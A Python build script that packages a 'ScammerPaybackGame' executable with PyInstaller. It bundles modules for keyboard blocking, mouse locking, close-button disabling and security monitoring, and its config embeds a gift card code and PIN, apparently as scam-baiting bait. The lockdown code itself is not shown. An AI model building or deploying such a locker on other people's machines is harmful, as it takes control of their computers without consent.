#!/usr/bin/env python3
import os
import sys
import json
import subprocess
import glob
import importlib.util

# Define PROJECT_ROOT (assuming export.py is in the builder folder)
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))

# Try to import get_data_path; if not available, define fallback.
try:
    from shared.utils.data_helpers import get_data_path
except ImportError:
    def get_data_path(relative_path):
        return os.path.join(PROJECT_ROOT, relative_path)

# Import normalization helper.
from builder.utils import normalize_task_type

# Import the manifest generator.
from generate_manifest import generate_static_manifest

def get_hidden_imports(project_root):
    if getattr(sys, "frozen", False):
        try:
            from builder.static_manifest import TASK_MANIFEST
            print("DEBUG: Frozen state. Using TASK_MANIFEST:", TASK_MANIFEST)
            return list(TASK_MANIFEST.values())
        except Exception as e:
            print("DEBUG: Error importing TASK_MANIFEST:", e)
            return []
    hidden_imports = []
    tasks_folder = os.path.join(get_data_path("shared/tasks"))
    for filepath in glob.glob(os.path.join(tasks_folder, "*.py")):
        filename = os.path.basename(filepath)
        if filename == "__init__.py":
            continue
        module_name = os.path.splitext(filename)[0]
        spec = importlib.util.spec_from_file_location(module_name, filepath)
        module = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(module)
            if hasattr(module, "TASK_TYPE"):
                normalized = normalize_task_type(module.TASK_TYPE)
                hidden_import = f"shared.tasks.{module_name}"
                print("DEBUG: Found module '{}' with TASK_TYPE '{}' normalized to '{}'".format(
                    module_name, module.TASK_TYPE, normalized))
                hidden_imports.append(hidden_import)
        except Exception as e:
            print("DEBUG: Error importing {}: {}".format(filename, e))
    additional_modules = [
        "shared.config",
        "shared.theme.theme",
        "shared.utils.close_button_blocker",
        "shared.utils.keyboard_blocker",
        "shared.utils.mouse_locker",
        "shared.utils.sleep_blocker",
        "shared.utils.security_monitor",
        "shared.utils.logger",
        "shared.utils.ui_keyboard",
    ]
    hidden_imports.extend(additional_modules)
    return hidden_imports

def get_data_files(project_root):
    data_files = []
    folders = [
        ("builder/config.json", "builder"),
        ("builder/tasks", "builder/tasks"),
        ("shared/theme", "shared/theme"),
        ("builder/data/gift_cards", "builder/data/gift_cards")
    ]
    for src_rel, dest_rel in folders:
        src_abs = os.path.join(project_root, src_rel)
        if not os.path.exists(src_abs):
            continue
        for root, _, files in os.walk(src_abs):
            for f in files:
                if f.lower().endswith((".json", ".qss")):
                    full_path = os.path.join(root, f)
                    rel_path = os.path.relpath(full_path, project_root)
                    data_files.append("{};{}".format(full_path, os.path.dirname(rel_path)))
    return data_files

def export_exe(custom_name, project_root, security_options, disable_lockdown=False):
    # Update config.json with the current security options.
    config_path = os.path.join(project_root, "builder", "config.json")
    try:
        if os.path.exists(config_path):
            with open(config_path, "r") as f:
                config = json.load(f)
        else:
            config = {}
    except Exception as e:
        print("DEBUG: Error reading config.json:", e)
        config = {}
    config.update(security_options)
    try:
        with open(config_path, "w") as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        return False, "Error writing config: {}".format(e)
    
    # Generate static manifest from the latest config.json.
    generate_static_manifest()
    
    # Set the main script (game.py) as the entry point.
    game_script = os.path.join(project_root, "game", "game.py")
    
    hidden_imports = get_hidden_imports(project_root)
    data_files = get_data_files(project_root)
    
    export_dir = os.path.join(project_root, "exported")
    os.makedirs(export_dir, exist_ok=True)
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--windowed",
        "--name", custom_name,
        "--paths", project_root,
    ]
    for imp in hidden_imports:
        cmd.extend(["--hidden-import", imp])
    for df in data_files:
        cmd.extend(["--add-data", df])
    cmd.append(game_script)
    
    print("DEBUG: Running PyInstaller with command:")
    print(" ".join(cmd))
    try:
        result = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return True, result.stdout
    except subprocess.CalledProcessError as e:
        return False, "PyInstaller error: {}".format(e.stderr)

if __name__ == "__main__":
    security_opts = {
        "ENABLE_SECURITY_MONITOR": True,
        "ENABLE_MOUSE_LOCKER": True,
        "ENABLE_SLEEP_BLOCKER": True,
        "CLOSE_BUTTON_DISABLED": True,
        "USE_UI_KEYBOARD": True,
        "KEYBOARD_BLOCKER_MODE": 1,
        "SECURITY_MODE": "Ethical",
        "selected_gift_card": {
            "name": "Google Play",
            "code": "8NDU-HRZ6-SUCZ-RQRF",
            "pin": "4261",
            "pin_required": True
        }
    }
    success, output = export_exe("ScammerPaybackGame", PROJECT_ROOT, security_opts, disable_lockdown=False)
    if success:
        print("Export successful!")
    else:
        print("Export failed:", output)
